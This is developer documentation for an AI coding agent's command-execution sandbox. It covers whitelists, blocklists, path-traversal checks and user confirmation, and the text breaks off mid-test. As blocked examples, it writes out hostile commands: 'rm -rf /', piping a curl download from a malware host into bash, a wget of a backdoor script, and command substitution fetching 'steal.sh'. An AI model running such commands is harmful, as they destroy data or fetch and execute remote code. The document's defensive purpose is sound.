# 🛡️ command_executor.py - Complete Documentation

## 🎯 Overview

**File**: `backend/src/core/command_executor.py`  
**Size**: 91,316 characters (91 KB)  
**Purpose**: The **security fortress** that prevents AI agents from executing dangerous commands

This is the **most critical security file** in VebGen—it's the **last line of defense** between the AI agent (CASE) and your system. While other AI coding tools let LLMs run commands with basic validation, VebGen treats **every command like a security audit** with:
- **Whitelist-only execution** (only approved commands run)
- **Regex blocklist** (dangerous patterns auto-blocked)
- **Multi-layer path validation** (prevents `../../etc/passwd` attacks)
- **User confirmation** (for sensitive operations)
- **No shell access** (AI never gets shell=True)

**Think of it as**: A security guard that checks every command the AI wants to run—rejecting 99% of dangerous requests before they touch your system.

---

## 🧠 For Users: What This File Does

### The Security Problem

**Other AI coding tools**:
What Cursor/Copilot might do:
```python
subprocess.run(llm_command, shell=True) # 🚨 DANGER!
```

If LLM says: `"python -c 'import os; os.system("rm -rf /")'"`
Your system is TOAST! 💀

**VebGen's Solution**:
What VebGen does:
```
Parse command: ["python", "-c", "import os; os.system(\"rm -rf /\")"]

Check whitelist: ✅ "python" is allowed

Validate arguments: ❌ "import os" contains "os.system" (blocked pattern)

Reject command: "Blocked potentially unsafe python -c command"

Log attempt: "Security violation detected"
```
Your system is SAFE! 🛡️

### Real Example: How Commands Are Validated

**Scenario**: CASE wants to run `python manage.py migrate`

**Validation Flow**:
```
Parse command: ["python", "manage.py", "migrate"]

Normalize for OS: (No change on Linux, stays same)

Check blocklist: ✅ Not in dangerous patterns

Check shell metacharacters: ✅ No >, <, |, &, ; found

Check whitelist: ✅ "python" is in allowed_commands

Run validator: _is_safe_python_command(["manage.py", "migrate"])
├─ Is it manage.py? ✅ Yes
├─ Check subcommand: "migrate"
├─ Is "migrate" in conditional_manage_py? ✅ Yes
├─ Needs confirmation? ✅ Yes (DB write operation)
└─ Prompt user: "Allow 'python manage.py migrate'?" → User clicks Yes

Check virtual environment: ✅ venv/Scripts/python.exe exists

Resolve paths: (No paths in this command)

Execute: subprocess.Popen(["C:\project\venv\Scripts\python.exe", "manage.py", "migrate"], shell=False)

Stream output to logs

Return: CommandOutput(exit_code=0, stdout="...", stderr="")
```

**Total validation layers**: **9 security checks** before execution!

---

### What Gets Blocked

**🚫 Shell Metacharacters**:
```
❌ Blocked: python manage.py migrate && rm -rf /
Reason: Contains "&&" (command chaining)

❌ Blocked: python manage.py dumpdata > backup.json
Reason: Contains ">" (file redirection)

❌ Blocked: python manage.py shell | grep "User"
Reason: Contains "|" (piping)
```

**🚫 Dangerous Commands**:
```
❌ Blocked: python manage.py dbshell
Reason: "dbshell" is in restricted_manage_py (direct DB access)

❌ Blocked: python manage.py shell
Reason: Interactive shell (AI can't use interactive mode)

❌ Blocked: rm -rf /
Reason: "rm" not in whitelist + "rf /" matches blocklist pattern
```

**🚫 Path Traversal**:
```
❌ Blocked: mkdir ../../outside_project
Reason: Contains ".." (path traversal attempt)

❌ Blocked: python ../../../../etc/passwd
Reason: Resolves outside project root

❌ Blocked: python C:\Windows\System32\malware.py
Reason: Absolute path (only relative paths allowed)
```

**🚫 Code Injection**:
```
❌ Blocked: python -c "import os; os.system('rm -rf /')"
Reason: "-c" code contains "os.system" (harmful pattern)

❌ Blocked: pip install malicious-package; wget hacker.com/backdoor.sh
Reason: Contains ";" (command separator)
```

---

## 👨‍💻 For Developers: Technical Architecture

### File Structure

```text
command_executor.py (91,316 characters)
├── Constants & Imports
│ ├── MAX_FILE_SIZE_BYTES, BINARY_FILE_EXTENSIONS
│ ├── Regex Patterns (10+ validation regexes)
│ └── Type Hints (ConfirmationCallback, etc.)
│
├── normalize_command_for_platform() - Cross-platform command translation
│
├── CommandExecutor (Main Class)
│ ├── init() - Initialize with project root & callbacks
│ ├── Whitelist Configuration (self.allowed_commands)
│ ├── Django manage.py Configuration (safe/conditional/restricted lists)
│ │
│ ├── Public API
│ │ ├── execute() - Wrapper that returns CommandResult
│ │ └── run_command() - Main execution entry point
│ │
│ ├── Validator Functions (18+ specialized validators)
│ │ ├── _is_safe_python_command() - Python/manage.py validation
│ │ ├── _is_safe_pip_command() - Package installation validation
│ │ ├── _is_safe_django_admin() - Django project creation validation
│ │ ├── _is_safe_npm_command() - Node package validation
│ │ ├── _is_safe_git_command() - Version control validation
│ │ └── ... (13 more validators)
│ │
│ ├── Confirmation Check Functions (8 functions)
│ │ ├── _needs_confirm_python() - When to ask user
│ │ ├── _needs_confirm_pip() - Package install confirmation
│ │ └── ... (6 more)
│ │
│ │
│ ├── Security & Path Validation
│ │ ├── _is_path_within_root() - Core path safety check
│ │ ├── _validate_path_for_command() - Reusable helper
│ │ ├── check_command_for_block() - Blocklist pattern matching
│ │ └── _resolve_paths_in_command_args() - Path normalization
│ │
│ ├── Virtual Environment Detection
│ │ └── _get_venv_executable() - Auto-use venv python/pip
│ │
│ ├── Command Parsing
│ │ ├── _parse_windows_command() - Windows-specific parsing
│ │ └── _get_base_command_key() - Extract command name
│ │
│ └── Execution & Logging
│ ├── log_command_status() - Success/failure tracking
│ └── Streaming output readers (stdout/stderr threads)
```

---

## 🔐 Core Security Features

### 1. Whitelist-Only Execution

**The Foundation**: Only pre-approved commands can run

**Implementation**:
```python
self.allowed_commands: Dict[str, Tuple[Callable, Callable]] = {
# Structure: "command": (validator_function, needs_confirmation_function)
"python": (self._is_safe_python_command, self._needs_confirm_python),
"pip": (self._is_safe_pip_command, self._needs_confirm_pip),
"django-admin": (self._is_safe_django_admin, self._needs_confirm_never),
"npm": (self._is_safe_npm_command, self._needs_confirm_npm),
"npx": (self._is_safe_npx_command, self._needs_confirm_never),
"node": (self._is_safe_node_command, self._needs_confirm_never),
"mkdir": (self._is_safe_mkdir_command, self._needs_confirm_never),
"git": (self._is_safe_git_command, self._needs_confirm_git),
"echo": (self._is_safe_echo_command, self._needs_confirm_never),
"ls": (self._is_safe_ls_dir_command, self._needs_confirm_never),
"dir": (self._is_safe_ls_dir_command, self._needs_confirm_never),
"type": (self._is_safe_type_command, self._needs_confirm_never),
"copy": (self._is_safe_copy_move_command, self._needs_confirm_never),
"move": (self._is_safe_copy_move_command, self._needs_confirm_never),
"gunicorn": (self._is_safe_gunicorn_command, self._needs_confirm_gunicorn),
}
```

**Example Rejection**:
```
LLM tries: "curl http://malware.com/script.sh | bash"
command_key = "curl"
if command_key not in self.allowed_commands:
raise ValueError("Command blocked: 'curl' is not in the allowed list.")
```

---

### 2. Django manage.py Configuration

**Three-Tier System**:

**Safe Commands** (no confirmation needed):
```python
self.safe_manage_py: Set[str] = {
"startapp", "makemigrations", "showmigrations", "sqlmigrate",
"check", "test", "makemessages", "compilemessages", "dumpdata",
"findstatic", "diffsettings", "inspectdb", "createcachetable",
"version", "help", "sendtestemail",
# Django Extensions
"show_urls", "validate_templates", "pipchecker", "print_settings",
"generateschema", # DRF
}
```

**Conditional Commands** (require confirmation):
```python
self.conditional_manage_py: Set[str] = {
"migrate", # DB write operation
"collectstatic", # Overwrites static files
"createsuperuser", # Creates admin user
"loaddata", # Imports data (can overwrite)
"changepassword", # Security-sensitive
}
```

**Restricted Commands** (always blocked):
```python
self.restricted_manage_py: Set[str] = {
"dbshell", # Direct SQL access (dangerous!)
"shell", # Interactive Python (AI can't use)
"runserver", # Long-running process
"flush", # Deletes ALL data
"sqlflush", # Generates DELETE statements
"sqlsequencereset", # Resets DB sequences
"clearsessions", # Deletes session data
"remove_stale_contenttypes", # DB modification
}
```

**Validation Example**:
```python
def _is_safe_python_manage_py(self, args: List[str]) -> bool:
    sub_command = args[1] # e.g., "migrate"

    # Block restricted commands
    if sub_command in self.restricted_manage_py:
        logger.warning(f"Blocked restricted manage.py command: {sub_command}")
        return False

    # Allow safe commands
    if sub_command in self.safe_manage_py:
        return True  # No extra validation needed

    # Conditional commands need extra validation
    if sub_command in self.conditional_manage_py:
        # Example: migrate requires --noinput flag
        if sub_command == "migrate" and "--noinput" not in args:
            logger.warning("Interactive migrate blocked. Use --noinput.")
            return False
        return True

    # Unknown command = blocked
    logger.warning(f"Blocked unknown manage.py command: {sub_command}")
    return False
```

---

### 3. Path Traversal Prevention

**The Core Security Method**:
```python
def _is_path_within_root(self, path_to_check: str | Path) -> bool:
    """
    Checks if a given path resolves safely within the project root.
    Prevents path traversal attacks. Accepts relative paths only.
    """
    try:
        path_str = str(path_to_check)

        # Layer 1: Input validation
        if not path_str or not isinstance(path_str, str):
            logger.warning(f"Path is empty or not a string")
            return False
        
        # Layer 2: Reject absolute paths
        if Path(path_str).is_absolute():
            logger.warning(f"Input path must be relative: {path_str}")
            return False
        
        # Layer 3: Reject paths starting with separator
        if path_str.startswith(os.sep) or (os.altsep and path_str.startswith(os.altsep)):
            logger.warning(f"Path starts with separator: {path_str}")
            return False
        
        # Layer 4: Reject ".." components
        if ".." in Path(path_str).parts:
            logger.warning(f"Path contains '..' component: {path_str}")
            return False
        
        # Layer 5: Resolve path relative to project root
        absolute_path = (self.project_root / path_str).resolve()
        
        # Layer 6: CRITICAL - Ensure resolved path is within root
        absolute_path.relative_to(self.project_root)
        # ^^ This raises ValueError if absolute_path is outside project_root
        
        logger.debug(f"Path safety check passed for '{path_str}'")
        return True
        
    except ValueError as e:
        logger.warning(f"Path resolves outside project root: {path_str}")
        return False
    except Exception as e:
        logger.error(f"Unexpected error during path safety check: {e}")
        return False
```

**Example Attacks Blocked**:
```
Attack 1: Classic path traversal
_is_path_within_root("../../etc/passwd")
Returns: False (Layer 4: Contains "..")

Attack 2: Absolute path
_is_path_within_root("/etc/passwd")
Returns: False (Layer 2: Is absolute)

Attack 3: Sneaky traversal
_is_path_within_root("myapp/../../../etc/passwd")
Returns: False (Layer 4: Contains "..")

Attack 4: Symlink escape (if symlink points outside)
symlink: myapp/link -> /etc
_is_path_within_root("myapp/link/passwd")
Returns: False (Layer 6: Resolves outside root)

Valid path ✅
_is_path_within_root("myapp/models.py")
Returns: True (All layers pass)
```

---

### 4. Regex Validation Patterns

**10+ Pre-Compiled Regexes**:

**IDENTIFIER_REGEX** (Python/Node package names):
```python
IDENTIFIER_REGEX = re.compile(r"^(?:@[a-zA-Z0-9_-]+/)?[a-zA-Z_][a-zA-Z0-9_-]*$")
```
Valid:
✅ "django"
✅ "rest_framework"
✅ "@angular/core"
✅ "django-rest-framework"

Invalid:
❌ "django; rm -rf /" (semicolon)
❌ "../malicious" (path traversal)
❌ "app$(whoami)" (command substitution)

**SAFE_PATH_REGEX** (File paths):
```python
SAFE_PATH_REGEX = re.compile(r"^(?![./\\])(?!.*[<>:\"|?*])(?!.*[./\\]$)[a-zA-Z0-9_\-\.\/\\]+$")
```
Valid:
✅ "blog/models.py"
✅ "static/css/style.css"
✅ "config/settings.py"

Invalid:
❌ "../etc/passwd" (starts with ..)
❌ "file>output.txt" (contains >)
❌ "C:\Windows\System32" (absolute path - caught by other validation)
❌ "file|grep" (contains |)

**GIT_COMMIT_MSG_REGEX**:
```python
GIT_COMMIT_MSG_REGEX = re.compile(r"^[^$]+$")
```
Valid:
✅ "Add user authentication feature"
✅ "Fix bug in login form"

Invalid:
❌ "Commit message $(curl hacker.com/steal.sh)" (command substitution)

---

### 5. Command Blocklist System

**Dynamic Pattern Matching**:

**`command_blocklist.json`** (example):
```json
{
"command_patterns": [
{
"blocked_pattern": "python -c [\"']import django.*inspect",
"description": "Direct Django module introspection via -c is blocked",
"param_extraction_regex": "import (\\S+)",
"safe_alternative_template": "Instead, read the file: {file_path}"
},
{
"blocked_pattern": "rm -rf /",
"description": "Attempting to delete root filesystem",
"safe_alternative_template": "Use specific file deletion or trash system"
}
]
}
```

**How It Works**:
```python
def check_command_for_block(self, command_str: str) -> None:
    for pattern_info in self.blocklist.get("command_patterns", []):
        if re.search(pattern_info["blocked_pattern"], command_str):
            safe_alternative = "No specific safe alternative determined."
            description = pattern_info.get("description", "Blocked pattern matched")

            # Try to extract parameters and suggest alternative
            param_regex = pattern_info.get("param_extraction_regex")
            safe_template = pattern_info.get("safe_alternative_template")
            
            if param_regex and safe_template:
                param_match = re.search(param_regex, command_str)
                if param_match:
                    # Convert module path to file path
                    module_path = param_match.group(1)
                    file_path = module_path.replace('.', '/') + '.py'
                    safe_alternative = safe_template.format(file_path=file_path)
            
            raise BlockedCommandException(command_str, safe_alternative, description)
```

**Example**:
```
LLM tries: python -c "import django.conf; print(django.conf)"
check_command_for_block('python -c "import django.conf; print(django.conf)"')

Raises: BlockedCommandException(
original_command='python -c "import django.conf; print(django.conf)"',
safe_alternative="Instead, read the file: django/conf/__init__.py",
description="Direct Django module introspection via -c is blocked"
)
System logs: "Command blocked. Substituted with: Instead, read the file: django/conf/__init__.py"
```

---

### 6. Virtual Environment Detection

**Auto-Use venv Executables**:

```python
def _get_venv_executable(self, command_name: str) -> Optional[Path]:
    """Finds the path to an executable inside the project's 'venv'."""
    # Normalize command names
    if command_name in ["python3", "py"]:
        command_name = "python"
    if command_name == "pip3":
        command_name = "pip"

    venv_dir = self.project_root / "venv"
    if not venv_dir.is_dir():
        logger.debug(f"Venv directory not found at {venv_dir}")
        return None

    # Platform-specific path
    if platform.system() == "Windows":
        exe_path = venv_dir / "Scripts" / f"{command_name}.exe"
    else:
        exe_path = venv_dir / "bin" / command_name

    if exe_path.is_file() and os.access(exe_path, os.X_OK):
        logger.debug(f"Found venv executable: {exe_path}")
        return exe_path
    else:
        logger.debug(f"Venv executable not found: {exe_path}")
        return None
```

**Usage**:
```
LLM command: "pip install django"
Without venv detection:
Runs: C:\Python310\Scripts\pip.exe install django (system-wide)
With venv detection:
venv_pip = _get_venv_executable("pip")

Returns: C:\project\venv\Scripts\pip.exe
Runs: C:\project\venv\Scripts\pip.exe install django (isolated!)
```

---

### 7. Cross-Platform Command Normalization

**Problem**: LLMs often generate Linux commands, but users may be on Windows

**Solution**: Automatic translation

```python
def normalize_command_for_platform(command: str) -> str:
    """
    Normalizes a command string for the current platform.
    Allows AI to generate OS-agnostic commands.
    """
    normalized_command = command

    if platform.system() == "Windows":
        # Replace Linux commands with Windows equivalents
        normalized_command = re.sub(r'\bls\b', 'dir', normalized_command)
        normalized_command = re.sub(r'\bcp\b', 'copy', normalized_command)
        normalized_command = re.sub(r'\bmv\b', 'move', normalized_command)
        normalized_command = re.sub(r'\brm\b', 'del', normalized_command)
        
        # Normalize path separators
        normalized_command = normalized_command.replace('/', '\\')

    return normalized_command
```

**Example**:
```
LLM generates (Linux-style): "ls -l"
On Windows:
original = "ls -l"
normalized = normalize_command_for_platform(original)
Result: "dir -l"

Path example:
original = "copy src/models.py backup/"
normalized = normalize_command_for_platform(original)
Result: "copy src\models.py backup\" (on Windows)
```

---

## 📚 Validator Functions Deep Dive

### 1. `_is_safe_python_command()`

**Handles**:
- Virtual environment creation
- `manage.py` commands (delegates to `_is_safe_python_manage_py`)
- Utility scripts in `utils/` subdirectory
- Simple checks like `--version`, `-m py_compile`
- `-c` code strings (with pattern filtering)

**Examples**:
```
✅ Allowed
_is_safe_python_command(["-m", "venv", "venv"])
_is_safe_python_command(["manage.py", "migrate"])
_is_safe_python_command(["utils/generate_report.py", "--format=pdf"])
_is_safe_python_command(["--version"])
_is_safe_python_command(["-m", "py_compile", "models.py"])
_is_safe_python_command(["-c", "print('Hello')"])

❌ Blocked
_is_safe_python_command(["-c", "import os; os.system('rm -rf /')"])
Reason: "-c" code contains "os.system"

_is_safe_python_command(["manage.py", "shell"])
Reason: "shell" is in restricted_manage_py

_is_safe_python_command(["../malicious.py"])
Reason: Path traversal (not in utils/, contains ..)
```

---

### 2. `_is_safe_pip_command()`

**Handles**:
- `pip install -r requirements.txt`
- `pip install <packages>` (with flags like `--upgrade`)
- `pip list`, `pip show`, `pip freeze`

**Validation Logic**:
```python
Allow: pip install -r requirements.txt
if args[0] == "install" and args[1] == "-r":
    req_file = args[2] # (after parsing flags)
    if self._validate_path_for_command(req_file):
        return True # ✅
    else:
        return False # ❌ Path outside root

Allow: pip install django celery --upgrade
if args[0] == "install" and args[1] != "-r":
    packages = []
    allowed_flags = {"--upgrade", "--no-cache-dir", "--force-reinstall", "--no-deps", "-U"}

    for arg in args[1:]:
        if arg.startswith('-'):
            if arg not in allowed_flags:
                logger.warning(f"Unrecognized flag: {arg}")
                return False  # ❌
        else:
            # Validate package name
            pkg_match = re.match(r"^[a-zA-Z0-9_\-\.]+(?:\[[a-zA-Z0-9_\-,]+\])?(?:[<>=!~]=?[0-9a-zA-Z\.\-\_\*]+)?$", arg)
            if not pkg_match:
                logger.warning(f"Invalid package specifier: {arg}")
                return False  # ❌
            packages.append(arg)

    if not packages:
        logger.warning("No packages specified")
        return False  # ❌

    return True  # ✅
```

**Examples**:
```
✅ Allowed
_is_safe_pip_command(["install", "-r", "requirements.txt"])
_is_safe_pip_command(["install", "django==4.2", "celery", "--upgrade"])
_is_safe_pip_command(["install", "djangorestframework[jwt]"])
_is_safe_pip_command(["list"])
_is_safe_pip_command(["show", "django"])
_is_safe_pip_command(["freeze"])

❌ Blocked
_is_safe_pip_command(["install", "malicious-package; curl hacker.com"])
Reason: Contains ";" (shell metacharacter)

_is_safe_pip_command(["install", "-r", "../../../etc/passwd"])
Reason: Path traversal

_is_safe_pip_command(["install", "--index-url=http://malware.com/pypi"])
Reason: Custom index URL not in allowed_flags
```

---

### 3. `_is_safe_git_command()`

**Handles**:
- `git init`
- `git add <files>`
- `git commit -m "message"`
- `git status`, `git log`
- `git checkout`, `git merge`
- `git clone`
- `git push` (blocks `--force`)

**Special Validation**:
```python
git add - validate pathspecs
if sub_command == "add":
    for pathspec in remaining_args:
        if pathspec == '.':
            continue # Allow adding all changes

        # Remove quotes (LLM might add them)
        unquoted = pathspec.strip("'\"")
        
        if not self._validate_path_for_command(unquoted):
            return False  # ❌ Path outside root
    return True  # ✅

git push - block force push
if sub_command == "push":
    if "-f" in remaining_args or "--force" in remaining_args:
        logger.warning("Blocked 'git push --force'")
        return False # ❌
    return True # ✅
```

**Examples**:
```
✅ Allowed
_is_safe_git_command(["init"])
_is_safe_git_command(["add", "."])
_is_safe_git_command(["add", "blog/models.py", "blog/views.py"])
_is_safe_git_command(["commit", "-m", "Add user authentication"])
_is_safe_git_command(["status", "--short"])
_is_safe_git_command(["checkout", "-b", "feature/new-ui"])
_is_safe_git_command(["push", "origin", "main"])

❌ Blocked
_is_safe_git_command(["add", "../../etc/passwd"])
Reason: Path traversal

_is_safe_git_command(["commit", "-m", "Evil $(curl hacker.com/steal.sh)"])
Reason: Message contains "$(" (command substitution)

_is_safe_git_command(["push", "--force"])
Reason: Force push explicitly blocked
```

---

## 🔄 Execution Flow

### Complete Validation Pipeline

**15-Step Process** (before any command runs):

```python
def run_command(self, command: str) -> CommandOutput:
    """Validates and executes a whitelisted command."""

    # STEP 1: Trim whitespace
    trimmed_command = command.strip()
    if not trimmed_command:
        raise ValueError("Empty command")

    # STEP 2: Normalize for OS (Windows translation)
    normalized_command = normalize_command_for_platform(trimmed_command)

    # STEP 3: Check against blocklist (pattern matching)
    try:
        self.check_command_for_block(normalized_command)
    except BlockedCommandException as e:
        # Replace with safe alternative
        logger.warning(f"Blocked: {e.original_command}. Using: {e.safe_alternative}")
        normalized_command = e.safe_alternative

    # STEP 4: Block shell metacharacters
    if any(char in normalized_command for char in ['>', '<', '|', '&', ';', '&&', '||']):
        raise ValueError("Command contains shell metacharacters")

    # STEP 5: Parse command string into list
    command_parts = shlex.split(normalized_command, posix=(platform.system() != "Windows"))

    # STEP 6: Extract command key
    command_key = self._get_base_command_key(command_parts[0])

    # STEP 7: Handle 'cd' internally (change project_root)
    if command_key == "cd":
        target_dir = args[0]
        potential_new_path = (self.project_root / target_dir).resolve()
        potential_new_path.relative_to(self.initial_project_root)  # Sandbox check
        self.project_root = potential_new_path  # Update CWD
        return CommandOutput(exit_code=0, stdout="Changed directory")

    # STEP 8: Check whitelist
    if command_key not in self.allowed_commands:
        raise ValueError(f"Command '{command_key}' not in whitelist")

    validator_func, needs_confirm_func = self.allowed_commands[command_key]

    # STEP 9: Run command-specific validator
    if not validator_func(args):
        raise ValueError(f"Arguments for '{command_key}' are invalid or unsafe")

    # STEP 10: Check for virtual environment
    venv_executable = self._get_venv_executable(command_key)
    if venv_executable:
        command_parts[0] = str(venv_executable)  # Use venv executable
    else:
        # Validate command exists in system PATH
        if not shutil.which(command_key):
            raise FileNotFoundError(f"Command '{command_key}' not found in PATH")

    # STEP 11: Resolve relative paths to absolute
    command_parts = self._resolve_paths_in_command_args(command_parts)

    # STEP 12: Request user confirmation (if needed)
    if needs_confirm_func(command_parts):
        if self.confirmation_cb:
            user_confirmed = self.confirmation_cb(normalized_command)
            if not user_confirmed:
                raise InterruptedError("Command cancelled by user")
        else:
            raise ValueError("Confirmation required but callback unavailable")

    # STEP 13: Pre-execution path validation
    for arg in command_parts[1:]:  # Skip command itself
        if is_potential_path(arg):
            if not self._is_path_within_root(arg):
                raise ValueError(f"Argument '{arg}' resolves outside root")

    # STEP 14: Execute command (shell=False for security)
    process = subprocess.Popen(
        command_parts,
        shell=False,  # 🔐 CRITICAL - Never use shell=True
        cwd=self.project_root,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )

    # STEP 15: Stream output and wait for completion
    stdout, stderr = process.communicate()
    return CommandOutput(
        exit_code=process.returncode,
        stdout=stdout,
        stderr=stderr
    )
```

---

## 📊 Key Metrics

| Metric | Value | Purpose |
|--------|-------|---------|
| **Whitelisted commands** | 15 | Only these can run |
| **Validator functions** | 18+ | Command-specific validation |
| **Confirmation checks** | 8 | Determine when to prompt user |
| **Regex patterns** | 10+ | Input validation |
| **Path validation layers** | 6 | Prevent traversal attacks |
| **Safe manage.py commands** | 20+ | Django commands (no confirm) |
| **Conditional manage.py** | 5 | Require confirmation |
| **Restricted manage.py** | 10+ | Always blocked |
| **Blocklist patterns** | Configurable | Dynamic command blocking |
| **shell=True usage** | 0 | Never used (security) |

---

## 🎓 Advanced Features

### 1. Stop Event Handling

**Allows canceling long-running commands**:

```python
In run_command()
while process.poll() is None:
    if self.stop_event and self.stop_event.is_set():
        logger.warning(f"Stop event received. Terminating process {process.pid}")
        process.terminate()
        try:
            process.wait(timeout=5) # Give it 5s to terminate
        except subprocess.TimeoutExpired:
            process.kill() # Force kill if needed
        raise InterruptedError("Command execution stopped by user")
    time.sleep(0.2) # Poll every 200ms
```

**Usage**:
```python
stop_event = threading.Event()
executor = CommandExecutor(project_root, stop_event=stop_event)

In background thread:
executor.run_command("python manage.py migrate")

User clicks Stop button:
stop_event.set() # Triggers graceful termination
```

---

### 2. Output Streaming

**Real-time log streaming** (prevents deadlocks):

```python
def read_stream(stream, output_list, log_prefix, log_level):
    """Read stream line-by-line and log each line."""
    try:
        if stream:
            for line in iter(stream.readline, ''):
                stripped_line = line.strip()
                logger.log(log_level, f"[{log_prefix}] {stripped_line}")
                output_list.append(stripped_line)
            stream.close()
    except Exception as e:
        logger.error(f"Error reading stream ({log_prefix}): {e}")

Use separate threads for stdout and stderr
stdout_thread = threading.Thread(target=read_stream, args=(process.stdout, stdout_lines, "CMD OUT", logging.INFO))
stderr_thread = threading.Thread(target=read_stream, args=(process.stderr, stderr_lines, "CMD ERR", logging.WARNING))

stdout_thread.start()
stderr_thread.start()

Wait for process to finish
while process.poll() is None:
    time.sleep(0.2)

Wait for threads to finish reading
stdout_thread.join(timeout=60)
stderr_thread.join(timeout=60)
```

---

### 3. Windows Built-in Command Handling

**Problem**: Commands like `dir`, `type`, `copy` aren't executables on Windows—they're shell built-ins

**Solution**: Prepend `cmd /c`

```python
is_windows = platform.system() == "Windows"
windows_builtins = {"dir", "type", "echo", "copy", "move", "del", "mkdir", "rmdir"}

if is_windows and command_key in windows_builtins:
    logger.info(f"Prepending 'cmd /c' for Windows built-in: {command_key}")
    popen_args = ['cmd', '/c'] + popen_args

Example: ["dir"] becomes ["cmd", "/c", "dir"]
```

---

## 🧪 Testing

VebGen includes **18 comprehensive tests** for Command Executor covering security validation, path sandboxing, venv detection, user confirmation, and command blocklisting.

### Run Tests

```bash
pytest src/core/tests/test_command_executor.py -v
```

**Expected output:**

```text
TestCommandValidation::test_allowed_simple_command ✓
TestCommandValidation::test_blocked_unsafe_command ✓
TestCommandValidation::test_blocked_command_with_shell_metacharacters ✓
TestCommandValidation::test_safe_mkdir_command ✓
TestCommandValidation::test_unsafe_mkdir_command_traversal ✓
TestCommandValidation::test_git_init_is_allowed ✓
TestCommandValidation::test_git_commit_needs_confirmation ✓
TestCommandValidation::test_pip_install_needs_confirmation ✓
TestPathSafety::test_cd_command_success ✓
TestPathSafety::test_cd_command_traversal_fails ✓
TestPathSafety::test_command_with_unsafe_path_argument ✓
TestPathSafety::test_absolute_path_argument_is_blocked ✓
TestVenv::test_uses_venv_python ✓
TestVenv::test_uses_venv_pip ✓
TestConfirmationCallback::test_confirmed_command_executes ✓
TestConfirmationCallback::test_cancelled_command_raises_interrupted_error ✓
TestConfirmationCallback::test_command_without_callback_fails_if_confirmation_needed ✓
TestBlocklist::test_blocked_command_is_substituted ✓

18 passed in 0.6s
```

### Test Coverage Breakdown

| Test Class | Tests | Description |
|---|---|---|
| **TestCommandValidation** | 8 tests | Whitelist enforcement, shell metacharacter blocking, confirmation triggers |
| **TestPathSafety** | 4 tests | Path traversal prevention, sandboxing, absolute path blocking |
| **TestVenv** | 2 tests | Virtual environment detection and automatic usage |
| **TestConfirmationCallback** | 3 tests | User confirmation workflow for risky commands |
| **TestBlocklist** | 1 test | Dynamic command substitution via blocklist |
| **Total:** | **18 tests** | with 100% pass rate |

### Test Categories

#### 1. Command Validation (8 tests)

**Test: `test_allowed_simple_command`**
```python
def test_allowed_simple_command(command_executor):
    """Verify whitelisted commands execute successfully"""
    result = command_executor.execute("echo Hello")
    
    assert result.success
    assert "Hello" in result.stdout
```

**Test: `test_blocked_unsafe_command`**
```python
def test_blocked_unsafe_command(command_executor):
    """Verify non-whitelisted commands are rejected"""
    with pytest.raises(ValueError, match="not in the allowed list"):
        command_executor.execute("rm -rf /")
```

**Test: `test_blocked_command_with_shell_metacharacters`**
```python
def test_blocked_command_with_shell_metacharacters(command_executor):
    """Verify shell injection attempts are blocked"""
    with pytest.raises(ValueError, match="shell metacharacters"):
        command_executor.execute("echo hello > output.txt")
    
    with pytest.raises(ValueError, match="shell metacharacters"):
        command_executor.execute("ls | grep txt")
```

**Test: `test_safe_mkdir_command`**
```python
def test_safe_mkdir_command(command_executor, project_root):
    """Verify safe directory creation"""
    result = command_executor.execute("mkdir new_dir")
    
    assert result.success
    assert (project_root / "new_dir").is_dir()
```

**Test: `test_unsafe_mkdir_command_traversal`**
```python
def test_unsafe_mkdir_command_traversal(command_executor):
    """Verify path traversal in mkdir is blocked"""
    with pytest.raises(ValueError, match="Path traversal detected"):
        command_executor.execute("mkdir ../another_dir")
```

**Test: `test_git_init_is_allowed`**
```python
def test_git_init_is_allowed(command_executor):
    """Verify git init is whitelisted"""
    result = command_executor.execute("git init")
    assert result.success
```

**Test: `test_git_commit_needs_confirmation`**
```python
def test_git_commit_needs_confirmation(command_executor, confirmation_callback):
    """Verify git commit triggers user confirmation"""
    confirmation_callback.return_value = True
    
    command_executor.execute('git commit -m "Initial commit"')
    
    confirmation_callback.assert_called_once()
```

**Test: `test_pip_install_needs_confirmation`**
```python
def test_pip_install_needs_confirmation(command_executor, confirmation_callback):
    """Verify pip install triggers user confirmation"""
    confirmation_callback.return_value = True
    
    command_executor.execute("pip install requests")
    
    confirmation_callback.assert_called_once()
```

#### 2. Path Safety (4 tests)

**Test: `test_cd_command_success`**
```python
def test_cd_command_success(command_executor, project_root):
    """Verify cd command changes working directory"""
    initial_cwd = command_executor.project_root
    
    result = command_executor.execute("cd subdir")
    
    assert result.success
    assert command_executor.project_root == (initial_cwd / "subdir").resolve()
```

**Test: `test_cd_command_traversal_fails`**
```python
def test_cd_command_traversal_fails(command_executor):
    """Verify cd cannot escape project root"""
    with pytest.raises(ValueError, match="outside project root"):
        command_executor.execute("cd ..")
```

**Test: `test_command_with_unsafe_path_argument`**
```python
def test_command_with_unsafe_path_argument(command_executor):
    """Verify commands with path traversal arguments are blocked"""
    with pytest.raises(ValueError, match="invalid or unsafe"):
        command_executor.execute("ls ../")
```

**Test: `test_absolute_path_argument_is_blocked`**
```python
def test_absolute_path_argument_is_blocked(command_executor):
    """Verify absolute paths are rejected"""
    abs_path = str(Path.home())
    
    with pytest.raises(ValueError, match="invalid or unsafe"):
        command_executor.execute(f"ls {abs_path}")
```

#### 3. Virtual Environment Detection (2 tests)

**Test: `test_uses_venv_python`**
```python
def test_uses_venv_python(executor_with_venv):
    """Verify executor prefers venv python over system python"""
    result = executor_with_venv.execute("python --version")
    
    assert "VENV PYTHON" in result.stdout
```

**Test: `test_uses_venv_pip`**
```python
def test_uses_venv_pip(executor_with_venv):
    """Verify executor prefers venv pip over system pip"""
    result = executor_with_venv.execute("pip --version")
    
    assert "VENV PIP" in result.stdout
```

#### 4. User Confirmation (3 tests)

**Test: `test_confirmed_command_executes`**
```python
def test_confirmed_command_executes(command_executor, confirmation_callback):
    """Verify confirmed commands execute"""
    confirmation_callback.return_value = True
    
    result = command_executor.execute("pip install pytest")
    
    assert result.success
    confirmation_callback.assert_called_once()
```

**Test: `test_cancelled_command_raises_interrupted_error`**
```python
def test_cancelled_command_raises_interrupted_error(command_executor, confirmation_callback):
    """Verify cancelled commands raise InterruptedError"""
    confirmation_callback.return_value = False
    
    with pytest.raises(InterruptedError, match="Command cancelled by user"):
        command_executor.execute("pip install pytest")
    
    confirmation_callback.assert_called_once()
```

**Test: `test_command_without_callback_fails_if_confirmation_needed`**
```python
def test_command_without_callback_fails_if_confirmation_needed(project_root):
    """Verify commands needing confirmation fail without callback"""
